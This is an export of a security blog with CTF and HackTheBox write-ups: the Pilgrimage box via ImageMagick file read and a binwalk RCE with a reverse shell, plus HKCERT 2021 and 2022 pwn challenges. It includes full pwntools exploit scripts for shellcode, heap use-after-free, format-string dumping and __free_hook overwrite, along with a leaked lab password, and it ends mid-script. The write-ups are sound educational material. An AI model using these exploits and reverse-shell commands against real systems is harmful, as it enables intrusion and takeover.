required a technique that i hadn\u0026rsquo;t learned yet. it\u0026rsquo;s better to learn from writeups directly instead of wasting a lot of time on guessing. this article also mentioned it:\nhttps://www.hackthebox.com/blog/it-is-okay-to-use-writeups\n","title":"My Experience on OSCP"},{"date":"2023-07-08","image":"","link":"https://bott0n.github.io/non-puublished-posts/hackthebox-writeup-pilgrimage/","summary":"","tags":["hackthebox"],"text":"user shell we found .git directory from nmap\nwe can use git-dumper to dump the git repo\n./git_dumper.py http://pilgrimage.htb/.git dump we found a binary file magick, google it we found a poc https://github.com/duc-nt/cve-2022-44268-imagemagick-arbitrary-file-read-poc\ntotal 26972 drwxr-xr-x 5 kali kali 4096 jul 8 02:30 . drwxr-xr-x 4 kali kali 4096 jul 8 04:44 .. drwxr-xr-x 6 kali kali 4096 jul 8 02:30 assets -rwxr-xr-x 1 kali kali 5538 jul 8 02:30 dashboard.php drwxr-xr-x 7 kali kali 4096 jul 8 02:30 .git -rwxr-xr-x 1 kali kali 9250 jul 8 02:30 index.php -rwxr-xr-x 1 kali kali 6822 jul 8 02:30 login.php -rwxr-xr-x 1 kali kali 98 jul 8 02:30 logout.php -rwxr-xr-x 1 kali kali 27555008 jul 8 02:30 magick -rwxr-xr-x 1 kali kali 6836 jul 8 02:30 register.php drwxr-xr-x 4 kali kali 4096 jul 8 02:30 vendor we now can read any file we want, from the source code, we found \u0026ldquo;sqlite:/var/db/pilgrimage\u0026rdquo;\nread that file, we can find the password of emily\nemily : abigchonkyboi123\nthen we are able to ssh with emaily\nroot from linpeas reuslt, we can find a file “/usr/sbin/malwarescan.sh” executed by root by reading the content, the script means:\n notice new created any file in \u0026ldquo;/var/www/pilgrimage.htb/shrunk/\u0026rdquo; binwalk the new files if the file containsed blacklist, it will remove it  the binwalk location is intersting, we dry run it once\nwe could knew it is v2.3.2, google it, we will find it has a rce vulnerability.\nas a result, we use the poc to gain the root reverse shell https://www.exploit-db.com/exploits/51249\n# in host: python3 lpe.py shit.png 10.10.14.35 443 nc -lvnp 443 # in victim: wget 10.10.14.35/binwalk_exploit.png ","title":"Hackthebox Writeup Pilgrimage"},{"date":"2022-11-19","image":"","link":"https://bott0n.github.io/posts/hkcertctf-2022-writeups/","summary":"","tags":["ctf"],"text":"shellcode_runner2 the challenge is named shellcode_runner. as the name said, this challenge is about to craft a shellcode to get a shell.\nthe source code is very short, create a rwx memory region at address 0x13370000, we can input a payload with 100 max size and the program will execute the payload as assembly code.\nshellcode = (char*) mmap((void *)0x13370000, size, prot_read|prot_write|prot_exec, map_anonymous|map_private, -1, 0); before executing, the program check the payload whether only include uppercase and digit nubmers.\nif (is_all_upper(shellcode) == 0) { _abort(\u0026#34;invalid shellcode!\\n\u0026#34;); } int is_all_upper(char* s) {a for (int i=0; i\u0026lt;strlen(s); i++) if (!isupper(s[i]) \u0026amp;\u0026amp; !isdigit(s[i]) \u0026amp;\u0026amp; s[i] != \u0026#39; \u0026#39;) return 0; return 1; } we can see from the source code that, the binary doesn\u0026rsquo;t limit the syscall, so our goal is clear, craft a shellcode and get the shell back.\nunintended solution locate the bug the unintended solution is very simple, in the shellcode checking function:\nint is_all_upper(char* s) {a for (int i=0; i\u0026lt;strlen(s); i++) if (!isupper(s[i]) \u0026amp;\u0026amp; !isdigit(s[i]) \u0026amp;\u0026amp; s[i] != \u0026#39; \u0026#39;) return 0; return 1; } strlen will stop at the first null byte of the string, so we can just padding the b'\\x00' before the shellcode, then we are able to craft the shellcode without limitation.\nsolution the plan is easy, use shellcraft.sh() to generate the getshell payload and padding the b'\\x00' before the payload.\nsl(b\u0026#39;\\x00\u0026#39;*4 + asm(shellcraft.sh())) full exploit from pwn import * target = \u0026#39;./chall\u0026#39; host = \u0026#39;chal.hkcert22.pwnable.hk\u0026#39; port = 28130 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 context.log_level = \u0026#39;debug\u0026#39; context.terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) # libc = elf(\u0026#39;\u0026#39;) else: p = process(target) libc = elf.libc gdbscript = \u0026#39;\u0026#39;\u0026#39;b *0x0000000000401b4b\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- helper functions s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=true :p.recvuntil(delims, drop) # misc functions uu32 = lambda data :u32(data.ljust(4, b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data :u64(data.ljust(8, b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{}= {:#x}\u0026#39;.format(name, addr)) #--- sl(b\u0026#39;\\x00\u0026#39;*4 + asm(shellcraft.sh())) p.interactive() intended solution after solving this chal, i am curious that this challenge shouldn\u0026rsquo;t worth 300 score if the above bug exist.\nthen, i asked the author and he said that was unintended solution.\nso, i decieded to solve this challenge with the intended solution - craft shellcode with only uppercase and digit number.\nsearch for similar challenge there is many type of similar shellcode challenge in various ctf such as alphanumeric shellcode, even number shellcode, odd number shellcode, etc\u0026hellip;\nafter searching in the internet, i found a similar shellcode challenge that is more stricted than the current which is only allowed hex number in the shellcode.\nhttps://ctftime.org/writeup/34583\nthe solution of the above is to write shellcode that makes use of xors of known constant data values in order to builds a loader shellcode.\nwe can also use the same method to solve this challenge with the opcode table. https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=x64_alphanumeric_opcodes\nexploit plan the first idea is, this challenge didn\u0026rsquo;t disallow any syscall, so we can try to craft a read syscall to bypass the limitation of byte instead of directly craft a execve(\u0026quot;/bin/sh\u0026quot;, 0, 0)\nthe program has told us the various register value before running the shellcode\nbefore running the shellcode: rax = 0x13370000 rbx = 0x7fff7afd0468 rcx = 0x40 rdx = 0x13370000 rbp = 0x7fff7afd0270 rsp = 0x7fff7afd01c0 rsi = 0x13370000 rdi = 0x40 r8 = 0xffffffff r9 = 0x40 r10 = 0x13370000 r11 = 0x7fff7afd01c0 r12 = 0x13370000 r13 = 0x40 to achieve the of read syscall, we need to control rax, rdi, rsi, rdx and from the above register info, we know that we only need to prepare the value of rax and rdi.\nwe abused xor al, $imm and xor [rdx + $offset], al to craft 0f05 of syscall and 5f of pop rdi.\n// craft syscall xor al, 0x44 xor al, 0x4b xor [rdx + 0x42], al xor al, 0x4e xor al, 0x44 xor [rdx + 0x43], al // craft pop rdi xor al, 0x5a xor [rdx + 0x41], al for the rax, we can use pop rax to get the 0 from stack memory. after that, we use push rax to pass the 0 to stack to pass it to rdi by pop rdi.\ncombine the plan together, we can have the read(0, 0x00000013370000, 0x00000013370000) call, then we just need to pass the payload from shellcraft.sh() with a few padding.\nfinally, we get the shell!.\nfull exploit from pwn import * target = \u0026#39;./chall\u0026#39; host = \u0026#39;chal.hkcert22.pwnable.hk\u0026#39; port = 28130 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 context.log_level = \u0026#39;debug\u0026#39; context.terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) # libc = elf(\u0026#39;\u0026#39;) else: p = process(target) libc = elf.libc gdbscript = \u0026#39;\u0026#39;\u0026#39;b *0x0000000000401b4b\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- helper functions s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=true :p.recvuntil(delims, drop) # misc functions uu32 = lambda data :u32(data.ljust(4, b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data :u64(data.ljust(8, b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{}= {:#x}\u0026#39;.format(name, addr)) #--- sc = asm(\u0026#39;\u0026#39;\u0026#39; // craft syscall xor al, 0x44 xor al, 0x4b xor [rdx + 0x42], al xor al, 0x4e xor al, 0x44 xor [rdx + 0x43], al // craft pop rdi xor al, 0x5a xor [rdx + 0x41], al \u0026#39;\u0026#39;\u0026#39;) # pop rax to be 0 sc += asm(\u0026#34;pop rax\u0026#34;) * 0x29 # padding sc += asm(\u0026#34;push rax\u0026#34;) * 5 # sc = \u0026#34;4d4k0bb4n4d0bc4z0baxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxppppp\u0026#34; # read(0, 0x00000013370000, 0x00000013370000) sla(\u0026#34;input your shellcode here (max: 100):\u0026#34;, sc) input(\u0026#34;getshell\u0026#34;) sl(b\u0026#34;a\u0026#34;*0x44 + asm(shellcraft.sh())) p.interactive() uaf2 vulnerability the bug is inremove_animal function\nfree(zoo.animals[choice]-\u0026gt;name); free(zoo.animals[choice]); there are not null the pointer after free, obivously this is a uaf bug.\nexploit plan the idea to exploit is use add_animal function to create eight 0x18 size chunk and free it all. as the same size of tcache is only 7 slot, the remaining one will into fast-bins.\nadd(1, \u0026#34;a\u0026#34;*0x18) # 0 add(1, \u0026#34;b\u0026#34;*0x18) # 1 add(1, \u0026#34;c\u0026#34;*0x18) # 2 add(1, \u0026#34;d\u0026#34;*0x18) # 3 remove(0) remove(1) remove(2) remove(3) here is the heap bins:\ngef➤ heap bins ──────────────────────────────────────── tcachebins for thread 1 ──────────────────────────────────────── tcachebins[idx=0, size=0x20] count=7 ← chunk(addr=0xc77380, size=0x20, flags=prev_inuse) ← chunk(addr=0xc77320, size=0x20, flags=prev_inuse) ← chunk(addr=0xc77340, size=0x20, flags=prev_inuse) ← chunk(addr=0xc772e0, size=0x20, flags=prev_inuse) ← chunk(addr=0xc77300, size=0x20, flags=prev_inuse) ← chunk(addr=0xc772a0, size=0x20, flags=prev_inuse) ← chunk(addr=0xc772c0, size=0x20, flags=prev_inuse) ───────────────────────────────── fastbins for arena at 0x7f17eea04c80 ───────────────────────────────── fastbins[idx=0, size=0x20] ← chunk(addr=0xc77360, size=0x20, flags=prev_inuse) fastbins[idx=1, size=0x30] 0x00 fastbins[idx=2, size=0x40] 0x00 fastbins[idx=3, size=0x50] 0x00 fastbins[idx=4, size=0x60] 0x00 fastbins[idx=5, size=0x70] 0x00 fastbins[idx=6, size=0x80] 0x00 ─────────────────────────────── unsorted bin for arena at 0x7f17eea04c80 ─────────────────────────────── [+] found 0 chunks in unsorted bin. ──────────────────────────────── small bins for arena at 0x7f17eea04c80 ──────────────────────────────── [+] found 0 chunks in 0 small non-empty bins. ──────────────────────────────── large bins for arena at 0x7f17eea04c80 ──────────────────────────────── [+] found 0 chunks in 0 large non-empty bins. afterwards, we can use add_animal again to create a overlap chunk and we can put the speak and got@printf inside the overlap for the libc address leakage by report_name.\nspeak = elf.symbols[\u0026#39;speak\u0026#39;] got_printf = elf.got[\u0026#39;printf\u0026#39;] payload = p64(speak) + p64(0) + p64(got_printf) add(1, payload) # 4 report(2) ru(\u0026#34;: \u0026#34;) libc_base = u64(r(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x60770 leak(\u0026#34;libc_base\u0026#34;, libc_base) gef➤ tele \u0026amp;zoo 0x000000004040c0│+0x0000: \u0026lt;zoo+0\u0026gt; add dword ptr [rax], eax 0x000000004040c8│+0x0008: 0x000000011522a0 → 0x00000001153392 → 0x0000000000000000 0x000000004040d0│+0x0010: 0x000000011522e0 → 0x00000001153252 → 0x0000000000000000 0x000000004040d8│+0x0018: 0x00000001152320 → 0x000000004012b3 → \u0026lt;speak+0\u0026gt; endbr64 0x000000004040e0│+0x0020: 0x00000001152360 → 0x0000000000001152 0x000000004040e8│+0x0028: 0x00000001152380 → 0x000000004012b3 → \u0026lt;speak+0\u0026gt; endbr64 gef➤ tele 0x00000001152320 0x00000001152320│+0x0000: 0x000000004012b3 → \u0026lt;speak+0\u0026gt; endbr64 0x00000001152328│+0x0008: 0x0000000000000000 0x00000001152330│+0x0010: 0x00000000404040 → 0x007fb77d78a770 → \u0026lt;printf+0\u0026gt; endbr64 finally, we put the system and \u0026ldquo;/bin/sh\u0026rdquo; address into the payload and create overlap chunks and get the shell.\nlibc_base = u64(r(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x60770 leak(\u0026#34;libc_base\u0026#34;, libc_base) system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] binsh = libc_base + next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;)) payload = p64(system) + p64(0) + p64(binsh) add(1, payload) add(1, payload) add(1, payload) report(1) full exploit from pwn import * target = \u0026#39;./chall\u0026#39; host = \u0026#39;chal.hkcert22.pwnable.hk\u0026#39; port = 28236 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 context.log_level = \u0026#39;debug\u0026#39; context.terminal = [\u0026#39;tmux\u0026#39;,\u0026#39;splitw\u0026#39;,\u0026#39;-h\u0026#39;] elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) libc = elf(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) else: p = process(target) libc = elf(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) gdbscript = \u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- helper functions s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda numb=4096 :p.recv(numb) ru = lambda delims, drop=true :p.recvuntil(delims, drop) # misc functions uu32 = lambda data :u32(data.ljust(4, b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data :u64(data.ljust(8, b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{}= {:#x}\u0026#39;.format(name, addr)) #--- def add(index, name): sla(\u0026#34;\u0026gt;\u0026#34;, \u0026#34;1\u0026#34;) sla(\u0026#34;\u0026gt;\u0026#34;, str(index)) sla(\u0026#34;name of animal?\u0026#34;, name) def remove(index): sla(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;2\u0026#39;) sla(\u0026#34;zone number? (0-9)\u0026#34;, str(index)) def report(index): sla(\u0026#34;\u0026gt;\u0026#34;, \u0026#39;3\u0026#39;) sla(\u0026#34;zone number? (0-9)\u0026#34;, str(index)) add(1, \u0026#34;a\u0026#34;*0x18) # 0 add(1, \u0026#34;b\u0026#34;*0x18) # 1 add(1, \u0026#34;c\u0026#34;*0x18) # 2 add(1, \u0026#34;d\u0026#34;*0x18) # 3 remove(0) remove(1) remove(2) remove(3) speak = elf.symbols[\u0026#39;speak\u0026#39;] got_printf = elf.got[\u0026#39;printf\u0026#39;] payload = p64(speak) + p64(0) + p64(got_printf) add(1, payload) # 4 report(2) ru(\u0026#34;: \u0026#34;) libc_base = u64(r(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x60770 leak(\u0026#34;libc_base\u0026#34;, libc_base) system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] binsh = libc_base + next(libc.search(b\u0026#39;/bin/sh\\x00\u0026#39;)) payload = p64(system) + p64(0) + p64(binsh) add(1, payload) add(1, payload) add(1, payload) report(1) p.interactive() ","title":"HKcert CTF 2022 Writeups"},{"date":"2021-11-17","image":"","link":"https://bott0n.github.io/posts/hkcertctf-2021-writeups/","summary":"","tags":["ctf"],"text":"hkcert21 - t0028 - writeups easyheap step 1: find the vulnerability void add(void) { char size; int user_index; int i; void *user_ptr; void *msg_ptr; user_index = 999; i = 0; do { if (0x13 \u0026lt; i) { lab_001013cc: if (user_index == 999) { puts(\u0026#34;can not add now\u0026#34;); } else { user_ptr = calloc(0x20,1); /* 123 */ *(void **)(\u0026amp;user_storage + (long)user_index * 8) = user_ptr; **(undefined4 **)(\u0026amp;user_storage + (long)user_index * 8) = 0; *(int *)(*(long *)(\u0026amp;user_storage + (long)user_index * 8) + 4) = dat_0010403c; dat_0010403c = dat_0010403c + 1; puts(\u0026#34;enter the message size for the user : \u0026#34;); __isoc99_scanf(\u0026amp;dat_0010203f,\u0026amp;size); if (size \u0026lt; \u0026#39;\\x01\u0026#39;) { puts(\u0026#34;bye hacker\u0026#34;); /* warning: subroutine does not return */ exit(0); } *(char *)(*(long *)(\u0026amp;user_storage + (long)user_index * 8) + 8) = size; msg_ptr = calloc((long)size,1); puts(\u0026#34;input message content \u0026gt;\u0026gt;\u0026#34;); read_all(msg_ptr,(int)size); *(void **)(*(long *)(\u0026amp;user_storage + (long)user_index * 8) + 0x18) = msg_ptr; } return; } if (*(long *)(\u0026amp;user_storage + (long)i * 8) == 0) { user_index = i; goto lab_001013cc; } i = i + 1; } while( true ); } void edit(void) { int index; char size; puts(\u0026#34;which user?\u0026#34;); __isoc99_scanf(\u0026amp;dat_00102074,\u0026amp;index); if ((index \u0026lt; 0) || (0x13 \u0026lt; index)) { puts(\u0026#34;out of range detected\u0026#34;); } else { if (*(long *)(\u0026amp;user_storage + (long)index * 8) == 0) { puts(\u0026#34;bye hacker\u0026#34;); /* warning: subroutine does not return */ exit(0); } size = *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8); puts(\u0026#34;input message content \u0026gt;\u0026gt;\u0026#34;); read_all(*(undefined8 *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 0x18),size + -1); *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8) = *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8) + -1; } return; } in add function, after created a user_ptr, the program will store the size in *user_ptr+8.\n*(char *)(*(long *)(\u0026amp;user_storage + (long)user_index * 8) + 8) = size; in edit function, the program will read size-1 byte and decrease the size and store it when we are finished editing.\nread_all(*(undefined8 *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 0x18),size + -1); *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8) = *(char *)(*(long *)(\u0026amp;user_storage + (long)index * 8) + 8) + -1; step2: exploit the bug therefore, we can exploit it to get a unlimited size.\n we create a size = 1 chunks. we edit it once, the program will decrease the size to be 0 if we edit it again, the read size will become negative number.  which mean we got a most unlimited size to write our data into the chunk.\nthought this bug, we can create overflow the data to change the size of neighbour chunk\u0026rsquo;s size (this size is the chunk size not the read size) and free it to have a unsorted bin and cause chunks overlap.\nadd(1, \u0026#34;a\u0026#34;) # chunks for padding for i in range(9): add(0x40, b\u0026#34;/bin/sh\\x00\u0026#34;) edit(0, \u0026#34;\\n\u0026#34;) # change the size of neighbour payload = p64(0)*3 + p64(0x431) edit(0, payload) # free it to get a unsorted bin remove(1) step 3: leak libc address then, we padding the first chunk to leak and get the libc_base address\nview(0) p.recvuntil(\u0026#34;a\u0026#34;*0x20) libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x1ebbe0 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] info(f\u0026#34;free_hook: {hex(free_hook)}\u0026#34;) step 4: get shell the last step is edit the first to write __free_hook to victim chunk and edit the victim with system to get shell\npayload = p64(free_hook) * 24 edit(0, payload) edit(2, p64(system)) remove(5) full exploit script:\nfrom pwn import * target = \u0026#39;./heap\u0026#39; host = \u0026#39;chalp.hkcert21.pwnable.hk\u0026#39; port = 28359 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 context.log_level = \u0026#39;debug\u0026#39; elf = elf(target) if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;remote\u0026#39;: p = remote(host, port) libc = elf(\u0026#39;./libc-2.31.so\u0026#39;) else: p = process(target, env={\u0026#34;ld_preload\u0026#34;: \u0026#34;./libc-2.31.so\u0026#34;}) libc = elf.libc gdbscript = \u0026#39;\u0026#39;\u0026#39; c heap chunks heap bins\u0026#39;\u0026#39;\u0026#39; if len(sys.argv) \u0026gt; 1 and sys.argv[1] == \u0026#39;gdb\u0026#39;: gdb.attach(p, gdbscript=gdbscript) #--- def add(size, data): p.sendlineafter(\u0026#34;$\u0026#34;, \u0026#34;1\u0026#34;) p.sendlineafter(\u0026#34;enter the message size for the user :\u0026#34;, str(size)) p.sendafter(\u0026#34;input message content \u0026gt;\u0026gt;\u0026#34;, data) def view(idx): p.sendlineafter(\u0026#34;$\u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;want to check the message of which user?\u0026#34;, str(idx)) def edit(idx, data): p.sendlineafter(\u0026#34;$\u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;which user?\u0026#34;, str(idx)) p.sendafter(\u0026#34;input message content \u0026gt;\u0026gt;\u0026#34;, data) def remove(idx): p.sendlineafter(\u0026#34;$\u0026#34;, \u0026#34;4\u0026#34;) p.sendlineafter(\u0026#34;delete which user?\u0026#34;, str(idx)) add(1, \u0026#34;a\u0026#34;) # chunks for padding for i in range(9): add(0x40, b\u0026#34;/bin/sh\\x00\u0026#34;) edit(0, \u0026#34;\\n\u0026#34;) # change the size of neighbour payload = p64(0)*3 + p64(0x431) edit(0, payload) # free it to get a unsorted bin remove(1) payload = \u0026#39;a\u0026#39;*0x20 edit(0, payload) view(0) p.recvuntil(\u0026#34;a\u0026#34;*0x20) libc_base = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x1ebbe0 info(f\u0026#34;libc_base: {hex(libc_base)}\u0026#34;) free_hook = libc_base + libc.symbols[\u0026#39;__free_hook\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] info(f\u0026#34;free_hook: {hex(free_hook)}\u0026#34;) payload = p64(free_hook) * 24 edit(0, payload) edit(2, p64(system)) remove(5) p.interactive() unobserved box step 1: dump the source code throught format string this challenge only give us the server to connect. my teammate tell me this challenge may have format string vulnerability when i was sleeping.\n┌──(bot3310㉿kali)-[~/ctf/hkcert2021/box] └─$ nc chalp.hkcert21.pwnable.hk 28132 130 ⨯ 1 ⚙ %p %x %c %d 0x7ffee2d4b670 e2d4b670 1179970944 is not the correct answer. after i few tries, we can\u0026rsquo;t get any useful information from the server. however, i remember liveoverflow has a video talk about a challenge like this. https://www.youtube.com/watch?v=xuzufuguqv0\u0026amp;t=450s\ni wrote a script to dump the source file and pass it to my teammate to reverse it.\nfull dump script:\nfrom pwn import * target = \u0026#39;./\u0026#39; host = \u0026#39;chalp.hkcert21.pwnable.hk\u0026#39; port = 28132 context.arch = \u0026#39;amd64\u0026#39; # i386/amd64 context.log_level = \u0026#39;debug\u0026#39; #elf = elf(target) #--- output = b\u0026#39;\u0026#39; addr = 0x400000 def dump(addr): sleep(0.1) p = remote(host, port) p.sendline(b\u0026#34;%7$s||||\u0026#34; + p64(addr)) text = p.recvuntil(\u0026#34;||||\u0026#34;, timeout=5000)[:-4] p.close() print(f\u0026#34;trying {hex(addr)}: {str(text)}{len(text)}\u0026#34;) return text myfile = open(\u0026#34;dump\u0026#34;, \u0026#34;ab\u0026#34;) while true: try: if addr \u0026gt; 0x406000: break data = dump(addr) if len(data) == 0: myfile.write(b\u0026#39;\\x00\u0026#39;) addr += 1 else: myfile.write(data) addr += len(data) except exception as e: continue #p.interactive() step 2: reverse now that we have the binary, we can use decompilers like ghidra to look at the original code. there are 3 functions that interest us the most:\nundefined8 fun_0040142f(void) { int ivar1; char local_28 [32]; fun_004013d9(local_28,0x1f); ivar1 = fun_00401192(local_28); if (ivar1 == 1) { fun_004012c8(); } else { printf(local_28); puts(\u0026#34; is not the correct answer.\u0026#34;); } return 0; } void fun_004013d9(void *param_1,int param_2) { ssize_t svar1; svar1 = read(0,param_1,(long)param_2); if (*(char *)((long)param_1 + (long)(int)svar1 + -1) == \u0026#39;\\n\u0026#39;) { *(undefined *)((long)param_1 + (long)(int)svar1 + -1) = 0; } return; } in fun_0040142f, we can see the familiar \u0026lt;user_input\u0026gt; is not the correct answer. message is in the else block. so maybe we should try to satisfy the other branching condition, by making fun_00401192(local_28) == 1. in the last line, fun_004013d9(local_28,0x1f) is reading string from stdin and preforming some string operations, so local_28 shoud be our input string. let\u0026rsquo;s look at fun_00401192 to see when will this function return 1:\nundefined8 fun_00401192(char *param_1) { int ivar1; size_t svar2; undefined8 uvar3; svar2 = strlen(param_1); if (svar2 == 0x13) { if ((param_1[6] == \u0026#39;_\u0026#39;) \u0026amp;\u0026amp; (param_1[9] == param_1[6])) { ivar1 = strncmp(param_1,\u0026#34;printf\u0026#34;,6); if (ivar1 == 0) { ivar1 = strncmp(param_1 + 10,\u0026#34;danger\u0026#34;,6); if (ivar1 == 0) { if (param_1[0x12] == \u0026#39;s\u0026#39;) { if (param_1[0x11] == \u0026#39;u\u0026#39;) { if (param_1[0x10] == \u0026#39;o\u0026#39;) { if (param_1[2] == param_1[7]) { if (param_1[8] == param_1[0x12]) { uvar3 = 1; } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } } else { uvar3 = 0; } return uvar3; } let s be the required string. we have\nlen(s) = 13 s[6] = s[9] = \u0026#39;_\u0026#39; s[1:5] = \u0026#39;printf\u0026#39; s[10:15] = \u0026#39;danger\u0026#39; s[16] = \u0026#39;o\u0026#39; s[17] = \u0026#39;u\u0026#39; s[18] = \u0026#39;s\u0026#39; s[2] = s[7] s[8] = s[18] which is \u0026quot;printf_is_dangerous\u0026quot;.\nfinally, send this string to the server and get flag:\n$ echo printf_is_dangerous | nc chalp.hkcert21.pwnable.hk 28132 hkcert21{l3aking_the_world_give_u_7h3_flag} flag: hkcert21{l3aking_the_world_give_u_7h3_flag}\nfortune cookie 1 step 1: fund the vulnerability this challenge has provided us the source code.\nin edit and read function, the program didn\u0026rsquo;t check the index smaller than 0.\nvoid edit_cookie() { long long idx; printf(\u0026#34;which cookie?[0-%d]: \u0026#34;, cookie_num-1); scanf(\u0026#34;%llu\u0026#34;, \u0026amp;idx); if (idx \u0026gt;= cookie_num) { _abort(\u0026#34;invalid index!\u0026#34;); } printf(\u0026#34;new message: \u0026#34;); int num_read = read(0, msg[idx], msg_size[idx]-1); if (msg[idx][num_read] == \u0026#39;\\n\u0026#39;) msg[idx][num_read] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;done!\\n\\n\u0026#34;); } void read_cookie() { long long idx; printf(\u0026#34;which cookie?[0-%d]: \u0026#34;, cookie_num-1); scanf(\u0026#34;%llu\u0026#34;, \u0026amp;idx); if (idx \u0026gt;= cookie_num) { _abort(\u0026#34;invalid index!\u0026#34;); } printf(\u0026#34;%s\\n\\n\u0026#34;, msg[idx]); } which mean we can read and edit the data outside the msg array in the address below the msg location, i found a important address.\ngef➤ tele (double*)\u0026amp;msg-0x10 20 0x000055770ddb4fe0│+0x0000: 0x00007f3f8ad10750 → \u0026lt;__libc_start_main+0\u0026gt; push r14 0x000055770ddb4fe8│+0x0008: 0x0000000000000000 0x000055770ddb4ff0│+0x0010: 0x0000000000000000 0x000055770ddb4ff8│+0x0018: 0x00007f3f8ad2a2e0 → \u0026lt;__cxa_finalize+0\u0026gt; push r15 0x000055770ddb5000│+0x0020: 0x0000000000000000 0x000055770ddb5008│+0x0028: 0x000055770ddb5008 → [loop detected] 0x000055770ddb5010│+0x0030: 0x0000000000000000 0x000055770ddb5018│+0x0038: 0x0000000000000000 0x000055770ddb5020│+0x0040: 0x00007f3f8b0b5620 → 0x00000000fbad2887 0x000055770ddb5028│+0x0048: 0x0000000000000000 0x000055770ddb5030│+0x0050: 0x00007f3f8b0b48e0 → 0x00000000fbad208b 0x000055770ddb5038│+0x0058: 0x0000000000000000 0x000055770ddb5040│+0x0060: 0x00007f3f8b0b5540 → 0x00000000fbad2087 0x000055770ddb5048│+0x0068: 0x0000000000000000 0x000055770ddb5050│+0x0070: 0x0000000000000000 0x000055770ddb5058│+0x0078: 0x0000000000000000 0x000055770ddb5060│+0x0080: 0x000055770e9c5240 → \u0026#34;the best thing to do first thing in the morning is\u0026#34; 0x000055770ddb5068│+0x0088: 0x000055770e9c52a0 → \u0026#34;every 60 seconds in africa a minute passes.\u0026#34; 0x000055770ddb5070│+0x0090: 0x000055770e9c52e0 → \u0026#34;monday hates you, too.\u0026#34; 0x000055770ddb5078│+0x0098: 0x000055770e9c5300 → \u0026#34;money is not everything. there\u0026#39;s always credit car[...]\u0026#34; you can see in 0x000055770ddb5008, there has a address pointer to itself.\nwe can control this address by index -11 to get the arbitrary write and read.\nstep 2: leak address by input -11 to show function, we can leak the data of that address which is it\u0026rsquo;s address.\np.recv(7) target = u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;)) + 0x80 info(f\u0026#34;target: {hex(target)}\u0026#34;) for i in range(27): create(0x88, b\u0026#34;/bin/sh\\x00\u0026#34;) step 3: leak libc address  edit it point to our controlable place, which is the address to store #5 chunk address edit it point to 0x000055770ddb5020 where stored a address of libc show the #5 chunk to leak the libc address  target = leak + 0x80 edit(-11, p64(target)) edit(-11, 